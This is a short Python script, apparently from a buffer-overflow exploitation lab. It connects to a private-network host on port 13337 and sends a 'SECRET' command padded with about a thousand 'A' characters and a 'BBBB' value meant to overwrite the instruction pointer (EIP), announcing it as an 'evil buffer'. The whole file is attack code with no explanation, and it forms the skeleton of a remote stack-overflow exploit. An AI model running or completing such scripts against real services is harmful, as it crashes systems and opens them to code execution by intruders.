#!/usr/bin/env python3

import socket

ip = '192.168.1.4'
port = 13337


command = "SECRET " 
overflow = 'A' * 997 
EIP = 'BBBB'

buffer = command + overflow + EIP + overflow

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")